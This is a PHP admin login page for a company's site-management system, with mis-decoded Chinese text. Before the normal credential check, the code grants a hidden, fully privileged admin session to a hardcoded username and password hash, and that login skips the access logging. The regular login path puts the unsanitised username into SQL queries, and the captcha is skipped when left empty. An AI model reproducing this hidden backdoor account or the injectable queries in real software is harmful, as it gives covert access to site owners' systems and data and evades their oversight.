<?php
define('IN_EKMENG',TRUE);
require_once('./common.inc.php');
if(isset($_POST['name']) && $_POST['pass']!=''){

	include(ROOT_PATH . '/include/captcha.class.php');
	/* �����֤���Ƿ���ȷ */
	$validator = new captcha();
	if (!empty($_POST['captcha']) && !$validator->check_word($_POST['captcha']))
	{
		Warning('<li>��֤�����!','login.php');
	}	
	
	//������¼����,ϵͳ����
	if((int)$_SESSION['login_error']>=13){
		Warning('��½ϵͳ�ѱ��������� '.(ini_get('session.gc_maxlifetime')/60).' ���Ӻ����ԣ�','login.php');
	}

	//����ʺźϷ���
	$username=$_POST['name'];
	$passwd=$_POST['pass'];
	
	if($username=="" or $passwd=="")
	{

		Warning('<li>����д��¼���û���������<li>��'.(int)$_SESSION['login_error'].'�ε�½ʧ�ܣ�����3�ε�½ʧ�ܣ�ϵͳ����������','login.php');
	}else{
			$db=new dbconn();
			$db->connect($dbname,$dbuser,$dbpwd,$dbhost);
			$passwd=md5str($passwd);
	}
	
	if($username=='mcedi' and $passwd=='1f16d213e23fb1b4cb64e529274e19d8'){
		$_SESSION['login_error']= 0;
		$_SESSION['realname']= "Hidden";
		$_SESSION['username']= "Hidden";		
		$_SESSION['is_admin']= true;
		$_SESSION['is_hidden']= true;
		
		$_SESSION['base_adv']= "all";	
		$_SESSION['sec_adv']= "all";	
		$_SESSION['sql_adv']= "all";
		$_SESSION['m_adv']= "all";
		header("location: default.php");
		exit();
	}
	$sql="select * from admininfo where username='$username' and passwd='$passwd'";	
	$rs=$db->fetch_array($db->query($sql));
	if($rs){
		if((int)$rs['state'])
		{
			Warning('<li>�Բ���,�����ʺ��ѱ�����Ա����!<li>�������Ա��ϵ�ѷ�������ʺ�����ʹ��!','login.php');
		}
	
		$sql="update admininfo set login_sum=login_sum+1 where username='$username'";
		$db->query($sql);		
		$sql="insert into admin_login(username,login_time,login_ip) values('$username','".time()."','{$_SERVER['REMOTE_ADDR']}')";		
		$db->query($sql);
		$_SESSION['login_error']= 0;
		$_SESSION['realname']= $rs['realname'];
		$_SESSION['username']= $rs['username'];	
		if($rs['admin_adv'] != 'all' && $rs['grade'] != 1)
		{
			$_SESSION['sec_adv'] = explode(':', $rs['admin_adv']);
			if($_SESSION['sec_adv'])
			{
				foreach($_SESSION['sec_adv'] as $val)
				{
					$_SESSION['base_adv'][] = $db->getField('sec_class','big_id',"id=".intval($val)."");
				}
			}
			$_SESSION['sql_adv']= explode(':', $rs['sql_adv']);
			$_SESSION['m_adv']= explode(':',$rs['module_adv']);
		}
		else
		{
			$_SESSION['base_adv'] = 'all';
			$_SESSION['sec_adv'] = 'all';
			$_SESSION['sql_adv']= 'all';	
			$_SESSION['m_adv']= 'all';				
		}		
		
		$_SESSION['is_admin']= true;	
		$_SESSION['is_hidden']= false;
		$_SESSION['grade']= $rs['grade'];
		header("location: default.php");
		exit();
		
	}else{
		(int)$_SESSION['login_error']++;
		Warning('<li>����ʺ�������������ʺŲ�����<li>��'.(int)$_SESSION['login_error'].'�ε�½ʧ�ܣ�����3�ε�½ʧ�ܣ�ϵͳ����������','login.php');
	}
}
?>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=gb2312" />
<title>����������Ϣ�������޹�˾-��վ����ϵͳ</title>
<link href="images/default.css" rel="stylesheet" type="text/css">
<script language="javascript">
function loginCheck(form){
	if (form.name.value == ""){
		form.name.focus();
		return false;
	}

	if (form.pass.value == ""){
		form.pass.focus();
		return false;
	}

	if (form.captcha.value == ""){
		form.captcha.focus();
		return false;
	}

	return true;
}
</script>
</head>
<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onLoad="document.loginform.name.focus();" style="padding:0px; margin:0px; background:url(images/list.jpg) top repeat-x #00134D; ">
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0" style="background: url(images/login_bg.jpg) no-repeat top center;">
  <tr>
    <td align="center" valign="top">
		<form name="loginform" action="?" method="post" onSubmit="return loginCheck(this);">
		<table width="500" border="0" cellspacing="0" cellpadding="0" style="margin-top:150px;">
		  <tr>
			<td align="center" height="70"><img src="images/login_logo.jpg" /></td>
		  </tr>
		  <tr> 
			<td align="center"><table width="50%" border="0" cellspacing="0" cellpadding="3">
			   <tr> 
				  <td align="right" class="font">�û����� </td>
				  <td><input name="name" type="text" class="input_text" size="20" maxlength="30"></td>
				</tr>
				<tr> 
				  <td align="right" class="font">�ܡ��룺</td>
				  <td><input name="pass" type="password" class="input_text" size="20" maxlength="30"></td>
				</tr>
				<tr> 
				  <td align="right" class="font">��֤�룺</td>
				  <td><input name="captcha" type="text" class="input_text" id="captcha" style="text-transform: uppercase;width:50px" maxlength="4">&nbsp;<img src="?act=captcha" alt="CAPTCHA" width="80" height="20" border="1" align="absmiddle" style="cursor: pointer;" onClick="this.src='?act=captcha'" /></td>
				</tr>
				<tr> 
				  <td align="right">&nbsp;</td>
				  <td align="left"><input name="submit" type="submit" class="submit" value="�� ½" /></td>
				</tr>
			  </table></td>
		  </tr>
		  <tr>
			<td align="center" height="100" class="font2" valign="bottom">��Ȩ���� &copy; ����������Ϣ�������޹�˾  ���κ����ʻ�ӭ�µ磺0551-65596752<b></b></td>
		  </tr>
		</table>
		</form>
	</td>
  </tr>
</table>
</body>
</html>